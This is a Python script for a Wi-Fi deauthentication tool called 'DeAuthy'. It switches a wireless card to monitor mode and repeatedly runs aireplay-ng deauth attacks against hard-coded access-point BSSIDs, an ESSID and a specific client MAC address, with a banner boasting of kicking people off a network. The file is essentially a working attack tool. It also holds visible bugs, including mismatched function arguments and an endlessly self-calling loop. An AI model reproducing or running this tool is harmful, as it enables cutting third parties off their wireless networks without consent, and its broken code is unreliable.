from os import geteuid
from socket import if_nameindex
from colorama import init, Fore, Back, Style
from subprocess import DEVNULL, STDOUT, check_call
from termcolor import colored
from sys import exit
from halo import Halo
from time import sleep

# Beautiful is better than ugly.
# Explicit is better than implicit.
# Simple is better than complex.
# Complex is better than complicated.
# Flat is better than nested.
# Sparse is better than dense.
# Readability counts.
# Special cases aren't special enough to break the rules.
# Although practicality beats purity.
# Errors should never pass silently.
# Unless explicitly silenced.
# In the face of ambiguity, refuse the temptation to guess.
# There should be one-- and preferably only one --obvious way to do it.
# Although that way may not be obvious at first unless you're Dutch.
# Now is better than never.
# Although never is often better than *right* now.
# If the implementation is hard to explain, it's a bad idea.
# If the implementation is easy to explain, it may be a good idea.
# Namespaces are one honking great idea -- let's do more of those!

white       = Fore.WHITE
red         = Fore.RED
yellow      = Fore.YELLOW
light_green = Fore.LIGHTGREEN_EX
magenta     = Fore.MAGENTA
cyan        = Fore.CYAN
blue        = Fore.BLUE
light_blue  = Fore.LIGHTBLUE_EX

# config here
class Config:
    iface_no_mon = "wlo1"
    iface_mon = "wlo1mon"
    ESSID = {"Internet":11} # <ESSID>:<It's channel>
    BSSIDs = {
        "28:C7:CE:4E:AF:B0":1,  # <BSSID>:<It's channel>
        "28:c7:ce:4e:af:bf":1,  # <BSSID>:<It's channel>
        "50:1C:BF:E2:DE:F0":11, # <BSSID>:<It's channel>
        "28:C7:CE:4F:06:C0":1,  # <BSSID>:<It's channel>
        "28:C7:CE:4F:04:F0":6,  # <BSSID>:<It's channel>
        } 
    STATION = "8C:F5:A3:38:CC:73" # aka client mac address, the device you wish to deauthenticate

def has_root():
    return geteuid() == 0

def clear():
    check_call(["clear"])


class deauthy:
    """Main class"""

    def DeAuThY():
        """Prefix for most output coming from DeAuthy"""
        return white + "[" + red + "D" + yellow + "e" + light_green + "A" + magenta + "u" + cyan + "T" + blue + "h" + red + "Y" + white + "]"

    def inform(msg: str):
        d_hey = white + "[" + light_green + "+" + white + "] "
        print(deauthy.DeAuThY() + d_hey + msg)

    def prompt(question: str, ending_color=white):
        d_huh = white + "[" + light_blue + "?" + white + "] "
        reply = input(deauthy.DeAuThY() + d_huh + f"{question}{white}> {ending_color}")
        return reply

    def tell_issue(msg: str):
        d_wut = white + "[" + red + "!" + white + "] "
        print(deauthy.DeAuThY() + d_wut + msg)

    def prompt_for_ifaces():
        clear()

        spinner = Halo(spinner='dots')
        def gather_ifaces():
            spinner.start()
            pos = 1
            sleep(5)
            for ifaces in if_nameindex():
                print(f"{white}[{yellow}{pos}{white}] {white}{ifaces[1]}\b")
                pos += 1
            spinner.stop()
            spinner.clear()
            return pos
        ifaces = gather_ifaces()
        method = deauthy.prompt(f"Which wire interface should be put into monitor mode? Enter corresponding number {light_blue}({yellow}1{white}-{yellow}{ifaces}{light_blue})", yellow)

    class Appearance:

        def printBanner():
            print(red + """

██████╗ ███████╗     █████╗ ██╗   ██╗████████╗██╗  ██╗██╗   ██╗
██╔══██╗██╔════╝    ██╔══██╗██║   ██║╚══██╔══╝██║  ██║╚██╗ ██╔╝
██║  ██║█████╗█████╗███████║██║   ██║   ██║   ███████║ ╚████╔╝ 
██║  ██║██╔══╝╚════╝██╔══██║██║   ██║   ██║   ██╔══██║  ╚██╔╝  
██████╔╝███████╗    ██║  ██║╚██████╔╝   ██║   ██║  ██║   ██║   
╚═════╝ ╚══════╝    ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝   ╚═╝                             
            """ + light_green + """
Time to kick off some assholes from yer net""")
            return True

    class BSSID:
        def deauth(bSSID: str):
            """"""
            channel = Config.BSSIDs[bSSID]
            deauthy.ChannelSys.hopper(channel)
            try:
                out = check_call(["aireplay-ng", "-0", "5", "-a", bSSID, "-c", Config.STATION, Config.iface_mon], stdout=DEVNULL, stderr=STDOUT)
            except KeyboardInterrupt:
                deauthy.InterfaceMode.switch("managed")
                return
    class ESSID:
        def deauth(eSSID: str):
            """"""
            channel = Config.ESSID[eSSID]
            deauthy.ChannelSys.hopper(channel)
            try:
                out = check_call(["aireplay-ng", "-0", "5", "-e", eSSID, "-c", Config.STATION, Config.iface_mon], stdout=DEVNULL, stderr=STDOUT)
            except KeyboardInterrupt:
                deauthy.InterfaceMode.switch("managed")
                return

    class ChannelSys:
        def hopper(channel_number: int):
            """Hop to a different channel"""
            out = check_call(["airmon-ng", "start", f"{Config.iface_no_mon}mon", f"{channel_number}"], stdout=DEVNULL, stderr=STDOUT)

    class InterfaceMode:
        def switch(card: str, mode: str):
            """
            Accepts either "monitor" or "managed"
            """
            def managed():
                out = check_call(["airmon-ng", "stop", f"{Config.iface_no_mon}mon"], stdout=DEVNULL, stderr=STDOUT)
            def monitor():
                out = check_call(["airmon-ng", "start", f"{Config.iface_no_mon}"], stdout=DEVNULL, stderr=STDOUT)
            modes = {
                "managed":managed,
                "monitor":monitor,
            }
            try:
                modes[mode]()
            except KeyError:
                raise RuntimeError("That's not a valid interface mode.")

def main():
    def do_bssid_method():
        for bssid, channel in Config.BSSIDs.items():
            deauthy.BSSID.deauth(bssid)
        try:
            do_bssid_method()
        except KeyboardInterrupt:
            deauthy.InterfaceMode.switch("managed")
            return
    
    deauthy.inform("Hey! Tip of the day: Parrot Security or Kali Linux is recommended! Although, real control freaks use ArchLinux")

    deauthy.prompt_for_ifaces()
    deauthy.InterfaceMode.switch("monitor")
    method = deauthy.prompt("Use given ESSID or the list of BSSIDs (BSSID / ESSID)")
    if method == "BSSID":
        try:
            do_bssid_method()
        except KeyboardInterrupt:
            deauthy.InterfaceMode.switch("managed")
            return
    if method == "ESSID":
        deauthy.ESSID.deauth(Config.ESSID)
        return

try:
    if not has_root():
        deauthy.tell_issue("Please run as Root... Quitting!!")
        exit(1)
    deauthy.Appearance.printBanner()
    main()
except KeyboardInterrupt:
    deauthy.InterfaceMode.switch("managed")